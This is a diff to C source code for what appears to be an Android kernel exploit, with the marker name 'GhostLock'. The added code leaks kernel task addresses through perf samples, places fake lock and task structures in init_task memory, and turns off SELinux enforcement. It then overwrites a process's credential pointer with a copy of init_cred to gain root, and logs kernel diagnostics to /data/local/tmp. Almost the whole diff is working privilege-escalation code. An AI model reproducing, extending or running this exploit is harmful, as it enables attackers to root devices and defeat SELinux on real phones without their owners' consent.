@@ -473,6 +473,12 @@ void run_main_route_threads(void) {
     usleep(5000);
   }
   durable_stage("route_done_observed");
+  /* Stop the consumer so a later in-process walk (UID0 cred) does not
+   * double-punch. Owner stays blocked; waiter has set route_done. */
+  atomic_store(&punch_consume_stop, 1);
+  pthread_join(consumer, NULL);
+  pthread_detach(waiter);
+  pthread_detach(owner);
 }
 
 static int do_one_write(uintptr_t target, const char *desc, int mode) {
@@ -754,6 +760,99 @@ static uint64_t perf_leak_text_base(int *out_samples, uint64_t *out_min_kip) {
   return best_base;
 }
 
+/* CPH DRAM linear map: P0 + ≤16GB. Z6/Z7 0xffffff87… leaks were toxic. */
+static int p0_dram_ptr(uintptr_t v) {
+  return v >= (uintptr_t)P0_PAGE_OFFSET &&
+         v < (uintptr_t)P0_PAGE_OFFSET + 0x400000000ULL;
+}
+
+static void diag_line(int fd, const char *s) {
+  pr_info("DIAG %s\n", s ? s : "?");
+  live_sync_log("DIAG", s ? s : "?");
+  if (fd >= 0 && s) {
+    size_t n = strlen(s);
+    if (n)
+      (void)write(fd, s, n);
+    (void)write(fd, "\n", 1);
+  }
+}
+
+/* After park, SELinux no longer blocks dmesg/kallsyms/packet. Snapshot
+ * before the cred punch so a later freeze still leaves a file. */
+static void uid0_park_diag(void) {
+  int fd = open("/data/local/tmp/uid0_diag.txt",
+                O_WRONLY | O_CREAT | O_TRUNC | O_SYNC, 0644);
+  char b[320], line[128];
+
+  read_first_line("/sys/fs/selinux/enforce", line, sizeof(line));
+  snprintf(b, sizeof(b), "enforce=%s", line);
+  diag_line(fd, b);
+  read_first_line("/proc/sys/kernel/kptr_restrict", line, sizeof(line));
+  snprintf(b, sizeof(b), "kptr_restrict=%s", line);
+  diag_line(fd, b);
+  read_first_line("/proc/sys/kernel/dmesg_restrict", line, sizeof(line));
+  snprintf(b, sizeof(b), "dmesg_restrict=%s", line);
+  diag_line(fd, b);
+  read_first_line("/proc/sys/kernel/perf_event_paranoid", line, sizeof(line));
+  snprintf(b, sizeof(b), "perf_event_paranoid=%s", line);
+  diag_line(fd, b);
+
+  errno = 0;
+  int kf = open("/proc/kallsyms", O_RDONLY);
+  snprintf(b, sizeof(b), "kallsyms_open fd=%d errno=%d", kf, errno);
+  diag_line(fd, b);
+  if (kf >= 0) {
+    char ks[240] = {0};
+    ssize_t n = read(kf, ks, sizeof(ks) - 1);
+    snprintf(b, sizeof(b), "kallsyms_head n=%zd %.80s", n, ks);
+    diag_line(fd, b);
+    close(kf);
+  }
+
+  errno = 0;
+  int pg = open("/proc/kpageflags", O_RDONLY);
+  snprintf(b, sizeof(b), "kpageflags fd=%d errno=%d", pg, errno);
+  diag_line(fd, b);
+  if (pg >= 0)
+    close(pg);
+
+  errno = 0;
+  int ps = socket(AF_PACKET, SOCK_RAW, 0);
+  snprintf(b, sizeof(b), "AF_PACKET fd=%d errno=%d", ps, errno);
+  diag_line(fd, b);
+  if (ps >= 0)
+    close(ps);
+
+  errno = 0;
+  int km = open("/dev/kmsg", O_RDONLY | O_NONBLOCK);
+  snprintf(b, sizeof(b), "kmsg fd=%d errno=%d", km, errno);
+  diag_line(fd, b);
+  if (km >= 0)
+    close(km);
+
+  {
+    char dmesg[2048];
+    errno = 0;
+    long sl = syscall(__NR_syslog, 3, dmesg, (long)sizeof(dmesg) - 1);
+    snprintf(b, sizeof(b), "syslog_read n=%ld errno=%d", sl, errno);
+    diag_line(fd, b);
+    if (sl > 80) {
+      dmesg[sl < (long)sizeof(dmesg) ? (size_t)sl : sizeof(dmesg) - 1] = 0;
+      char *tail = dmesg;
+      if (sl > 400)
+        tail = dmesg + sl - 400;
+      snprintf(b, sizeof(b), "dmesg_tail %.240s", tail);
+      diag_line(fd, b);
+    }
+  }
+
+  snprintf(b, sizeof(b), "page_base=%016zx fake_lock=%016zx cred_copy=%016zx",
+           page_base, fake_lock, g_cred_copy);
+  diag_line(fd, b);
+  if (fd >= 0)
+    close(fd);
+}
+
 /* perf_find_task - only used when perf is available (shell context) */
 static uintptr_t perf_find_task(void) {
   struct perf_event_attr pe;
@@ -771,10 +870,17 @@ static uintptr_t perf_find_task(void) {
 
   errno = 0;
   int fd = (int)syscall(__NR_perf_event_open, &pe, 0, -1, -1, 0);
-  if (fd < 0) { pr_error("perf_event_open failed errno=%d\n", errno); return 0; }
+  if (fd < 0) {
+    pr_info("perf_event_open failed errno=%d\n", errno);
+    return 0;
+  }
   size_t msz = 4096 * (1 + 32);
   void *buf = mmap(NULL, msz, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
-  if (buf == MAP_FAILED) { pr_error("perf mmap failed errno=%d\n", errno); close(fd); return 0; }
+  if (buf == MAP_FAILED) {
+    pr_info("perf mmap failed errno=%d\n", errno);
+    close(fd);
+    return 0;
+  }
   ioctl(fd, PERF_EVENT_IOC_ENABLE, 0);
   for (volatile int i = 0; i < 500000; i++) syscall(__NR_getpid);
   ioctl(fd, PERF_EVENT_IOC_DISABLE, 0);
@@ -785,6 +891,7 @@ static uintptr_t perf_find_task(void) {
   size_t dsz = 4096 * 32;
   uint64_t pos = hdr->data_tail;
   uintptr_t cands[256]; int nc = 0;
+  int n_hi = 0;
   while (pos < head && nc < 256) {
     struct perf_event_header *ev = (void *)(base + (pos % dsz));
     if (ev->size == 0) break;
@@ -796,22 +903,28 @@ static uintptr_t perf_find_task(void) {
         uint64_t *regs = (uint64_t *)p;
         for (int i = 0; i < 32 && nc < 256; i++) {
           uint64_t v = regs[i];
-          if (v > 0xffffff8000000000ULL && v < 0xfffffffe00000000ULL)
+          if (p0_dram_ptr(v))
             cands[nc++] = v;
+          else if (v > 0xffffff8000000000ULL && v < 0xfffffffe00000000ULL)
+            n_hi++;
         }
       }
     }
     pos += ev->size;
   }
   hdr->data_tail = head; munmap(buf, msz); close(fd);
-  if (!nc) return 0;
+  if (!nc) {
+    pr_info("perf task: none in P0 DRAM window (hi_alias=%d)\n", n_hi);
+    return 0;
+  }
   uintptr_t best = 0; int best_cnt = 0;
   for (int i = 0; i < nc; i++) {
     int cnt = 0;
     for (int j = 0; j < nc; j++) if (cands[j] == cands[i]) cnt++;
     if (cnt > best_cnt) { best_cnt = cnt; best = cands[i]; }
   }
-  pr_info("perf task: 0x%016zx (%d/%d votes)\n", best, best_cnt, nc);
+  pr_info("perf task: 0x%016zx (%d/%d p0 votes, hi_alias=%d)\n",
+          best, best_cnt, nc, n_hi);
   return best;
 }
 
@@ -852,6 +965,172 @@ static pid_t spawn_child(struct child_pipes *p) {
   if (child == 0) { child_main(p); _exit(1); }
   close(p->task_w); close(p->cmd_r); close(p->uid_w);
   return child;
+}
+
+/* Same-process W2 after a live Z4 park. Z5 (second GhostLock process) KP'd. */
+static int uid0_cred_walk(void) {
+  pr_success("UID0: park live — diag then cred if P0 task leak\n");
+  durable_stage("uid0_park_ok");
+  live_sync_log("UID0", "park_ok");
+  uid0_park_diag();
+
+  unsetenv("MODE4_SLIDE_ZERO");
+  setenv("MODE4_SLIDE_CRED", "1", 1);
+
+  uintptr_t self_task = perf_find_task();
+  {
+    char b[96];
+    snprintf(b, sizeof(b), "self_task=%016zx p0=%d", self_task,
+             p0_dram_ptr(self_task));
+    pr_info("UID0 %s\n", b);
+    live_sync_log("UID0", b);
+  }
+
+  struct child_pipes pipes;
+  pid_t child = spawn_child(&pipes);
+  if (child < 0) {
+    pr_info("UID0: fork failed\n");
+    live_sync_log("UID0", "fork_fail");
+    return 1;
+  }
+
+  uintptr_t child_task = 0;
+  if (read(pipes.task_r, &child_task, sizeof(child_task)) !=
+      (ssize_t)sizeof(child_task))
+    child_task = 0;
+  close(pipes.task_r);
+
+  if (!p0_dram_ptr(child_task)) {
+    pr_info("UID0: child leak not P0 DRAM — retry once\n");
+    live_sync_log("UID0", "perf_miss_retry");
+    close(pipes.cmd_w);
+    close(pipes.uid_r);
+    waitpid(child, NULL, 0);
+    child = spawn_child(&pipes);
+    if (child < 0) {
+      pr_info("UID0: retry fork failed\n");
+      return 1;
+    }
+    if (read(pipes.task_r, &child_task, sizeof(child_task)) !=
+        (ssize_t)sizeof(child_task))
+      child_task = 0;
+    close(pipes.task_r);
+  }
+
+  uintptr_t use_task = 0;
+  const char *who = "none";
+  if (p0_dram_ptr(child_task)) {
+    use_task = child_task;
+    who = "child";
+  } else if (p0_dram_ptr(self_task)) {
+    use_task = self_task;
+    who = "self";
+  }
+
+  if (!use_task) {
+    pr_info("UID0: no P0 DRAM task leak — skip cred, keep park, diag only\n");
+    live_sync_log("UID0", "diag_only_no_p0_task");
+    durable_stage("uid0_diag_only");
+    close(pipes.cmd_w);
+    close(pipes.uid_r);
+    waitpid(child, NULL, WNOHANG);
+    return 0;
+  }
+
+  uintptr_t cred_slot = use_task + TASK_CRED_OFF;
+  uintptr_t icred = data_addr(g_init_cred_image);
+  {
+    char b[220];
+    snprintf(b, sizeof(b),
+             "who=%s pid=%d task=%016zx cred_off=%x slot=%016zx init_cred=%016zx "
+             "copy=%016zx",
+             who, (int)child, use_task, (unsigned)TASK_CRED_OFF, cred_slot,
+             icred, g_cred_copy);
+    pr_info("UID0 %s\n", b);
+    live_sync_log("UID0", b);
+  }
+  durable_stage("uid0_w2_enter");
+
+  /*
+   * Park is spray-free (BSS lock). cred_copy lives on a sprayed page used
+   * only as VALUE. Overlay lock/task stay init_task BSS so reclaim miss
+   * cannot poison select (Z9–Z13).
+   */
+  {
+    uint64_t it_off = (active_offsets && active_offsets->off_init_task)
+                          ? active_offsets->off_init_task
+                          : 0x027CC000ULL;
+    uintptr_t bss_lock = data_addr(KIMAGE_TEXT_BASE + it_off + 0x878ULL);
+    uintptr_t it_p0 = data_addr(KIMAGE_TEXT_BASE + it_off);
+    if (!g_cred_copy) {
+      pr_info("UID0: post-park spray for cred_copy only (overlay stays BSS)\n");
+      live_sync_log("UID0", "cred_copy_spray");
+      setenv("SKIP_DRAIN", "1", 1);
+      setenv("LIGHT_DRAIN", "1", 1);
+      set_pselect_write_mode(use_task + TASK_CRED_OFF, 0, 4);
+      page_base = prepare_good_kernel_page(PAGE_PAYLOAD_FOPS);
+    }
+    fake_lock = bss_lock;
+    fake_task = it_p0;
+  }
+  if (!g_cred_copy) {
+    pr_info("UID0: cred_copy spray missed — skip W2, park stays\n");
+    live_sync_log("UID0", "no_cred_copy");
+    close(pipes.cmd_w);
+    close(pipes.uid_r);
+    waitpid(child, NULL, WNOHANG);
+    return 0;
+  }
+  pr_info("=== UID0 W2 cred (reuse spray) === target=0x%016zx lock=%016zx "
+          "cred_copy=%016zx\n",
+          cred_slot, fake_lock, g_cred_copy);
+  pselect_child_node = 1;
+  set_pselect_write_mode(cred_slot, 0, 4);
+  run_main_route_threads();
+  clear_pselect_write();
+
+  write(pipes.cmd_w, "C", 1);
+  uint32_t child_uid = 9999;
+  if (read(pipes.uid_r, &child_uid, sizeof(child_uid)) !=
+      (ssize_t)sizeof(child_uid))
+    child_uid = 9999;
+  uint32_t self_uid = (uint32_t)getuid();
+  {
+    char b[80];
+    snprintf(b, sizeof(b), "child_uid=%u self_uid=%u who=%s",
+             child_uid, self_uid, who);
+    pr_info("UID0 %s\n", b);
+    live_sync_log("UID0", b);
+  }
+
+  int pf = open("/data/local/tmp/ghostlock_uid0",
+                O_WRONLY | O_CREAT | O_TRUNC | O_SYNC, 0644);
+  if (pf >= 0) {
+    char b[128];
+    int n = snprintf(b, sizeof(b), "child_uid=%u self_uid=%u who=%s task=%016zx\n",
+                     child_uid, self_uid, who, use_task);
+    if (n > 0)
+      (void)write(pf, b, (size_t)n);
+    close(pf);
+  }
+
+  if (child_uid == 0 || self_uid == 0) {
+    pr_success("UID0 WIN child is root\n");
+    durable_stage("uid0_WIN");
+    live_sync_log("UID0", "WIN");
+    write(pipes.cmd_w, "G", 1);
+    close(pipes.cmd_w);
+    close(pipes.uid_r);
+    sleep(2);
+    return 0;
+  }
+
+  pr_info("UID0: child still uid=%u — one punch, stopping\n", child_uid);
+  durable_stage("uid0_miss");
+  close(pipes.cmd_w);
+  close(pipes.uid_r);
+  waitpid(child, NULL, WNOHANG);
+  return 1;
 }
 
 #define SYS_getdents64 217
@@ -1311,7 +1590,22 @@ int run_exploit(int argc, char **argv) {
     pselect_child_node = 1;
     TIMER("  heap spray start");
     durable_stage("spray_start");
-    if (env_flag("MODE4_STATIC_CHAIN", 0) &&
+    if (env_flag("MODE4_SLIDE_ZERO", 0) &&
+        !env_flag("MODE4_SLIDE_CRED", 0)) {
+      /* Z9–Z13 died at pselect overlay of sprayed lock/task when reclaim
+       * missed. Park write is stack-only; pin lock/task to init_task BSS. */
+      uint64_t it_off = (active_offsets && active_offsets->off_init_task)
+                            ? active_offsets->off_init_task
+                            : 0x027CC000ULL;
+      uintptr_t bss_lock = data_addr(KIMAGE_TEXT_BASE + it_off + 0x878ULL);
+      page_base = bss_lock;
+      fake_lock = bss_lock;
+      fake_fops = bss_lock;
+      fake_task = data_addr(KIMAGE_TEXT_BASE + it_off);
+      pr_info("SLIDE_ZERO spray skipped: lock=init_task+0x878 %016zx "
+              "task=init_task_p0 %016zx\n",
+              fake_lock, fake_task);
+    } else if (env_flag("MODE4_STATIC_CHAIN", 0) &&
         !env_flag("MODE4_SC_SPRAY", 0)) {
       /* Spray-free chain: table lives in the kernel image tail;
        * dummies satisfy do_pselect_fake_lock_route guards. */
@@ -1362,8 +1656,9 @@ int run_exploit(int argc, char **argv) {
     int boot_wrote = strcmp(boot_before, boot_after) != 0;
     int enf_wrote = (enf_before[0] != enf_after[0]);
     int landed = 0;
-    if (!strcmp(tgt_name, "enforce") || !strcmp(tgt_name, "selinux"))
-      landed = enf_wrote;
+    if (!strcmp(tgt_name, "enforce") || !strcmp(tgt_name, "selinux") ||
+        !strcmp(tgt_name, "dataonly"))
+      landed = enf_wrote || (enf_after[0] == '0');
     else if (!strcmp(tgt_name, "fops") || !strcmp(tgt_name, "misc"))
       landed = (cfi_last_step == 0 && cfi_dirty_seen) || (cfi_write_ret > 0);
     else if (!strcmp(tgt_name, "spray"))
@@ -1397,6 +1692,20 @@ int run_exploit(int argc, char **argv) {
     pr_info("WRITE_PROOF %s — stopping (no W1). MODE4_ONLY implied.\n",
             landed ? "POSITIVE store executes on-device"
                    : "NEGATIVE (walk miss / wrong alias / no write)");
+    /*
+     * Same-process park→cred. Z5 second process on a park boot KP'd at
+     * requeue. fire_mode sets MODE4_ONLY so this must run here, before
+     * the write_proof return.
+     */
+    if (env_flag("MODE4_UID0", 0)) {
+      int park_ok = enf_wrote || check_selinux_off() || (enf_after[0] == '0');
+      if (!park_ok) {
+        pr_info("UID0: park miss (enforce still on) — not walking cred\n");
+        live_sync_log("UID0", "park_miss");
+        return 1;
+      }
+      return uid0_cred_walk();
+    }
     /*
      * SWAP_HOLD: waiter sleeps with spray live. N11/N12: opening the
      * swapped ashmem node panics. Second walk is data-only SLIDE_ZERO
